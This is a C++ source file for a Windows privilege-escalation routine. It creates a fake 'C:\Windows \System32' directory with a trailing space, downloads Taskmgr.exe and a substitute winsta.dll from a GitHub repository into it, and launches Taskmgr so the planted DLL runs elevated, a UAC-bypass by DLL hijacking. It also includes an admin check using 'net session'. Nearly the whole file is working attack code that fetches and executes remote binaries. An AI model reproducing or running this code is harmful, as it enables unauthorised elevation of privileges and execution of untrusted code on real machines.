#include "PrivilegeEscalation.h"


// This function tries to privilege escalation
const bool PrivilegeEscalation::run(void)
{
    // Mocking System32 Directory
    CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
    CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0);

    // Downloading Taskmge.exe into mocked System32 from Git Repository
    bool taskmgr = System::downloadFile(L"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/Taskmgr.exe", L"\\\\?\\C:\\Windows \\System32\\Taskmgr.exe");
    // Downloading Winsta.dll into mocked System32 from Git Repository
    bool winsta = System::downloadFile(L"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll", L"\\\\?\\C:\\Windows \\System32\\Winsta.dll");

    // Checking for Files and Run Them
    if (System::fileExist("C:\\Windows \\System32\\Taskmgr.exe") && System::fileExist("C:\\Windows \\System32\\winsta.dll"))
    {
        System::createProcess("cmd.exe /c \"C:\\Windows \\System32\\Taskmgr.exe\"");
        return true;
    }
    
    return false;
}

// This function checks if the current process is run as system admin
const bool PrivilegeEscalation::systemAdminCheck(void)
{
    int exitCode = system("net session >nul 2>&1"); // This command require high-privileged user
    return !exitCode;
}
